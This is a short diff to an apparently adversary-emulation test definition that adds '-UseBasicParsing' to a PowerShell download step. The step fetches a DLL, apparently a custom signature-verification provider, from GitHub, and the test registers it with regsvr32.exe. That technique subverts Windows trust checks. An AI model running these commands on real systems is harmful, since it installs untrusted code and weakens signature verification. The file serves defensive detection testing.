@@ -22,7 +22,7 @@ atomic_tests:
       if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/gtworek/PSBits/raw/2aa885c7d09f7f100997bfa5ee0c404084177f24/SIP/GTSIPProvider.dll" -OutFile "#{dll_payload}"
+      Invoke-WebRequest "https://github.com/gtworek/PSBits/raw/2aa885c7d09f7f100997bfa5ee0c404084177f24/SIP/GTSIPProvider.dll" -OutFile "#{dll_payload}" -UseBasicParsing
   executor:
     command: |
       regsvr32.exe #{dll_payload}
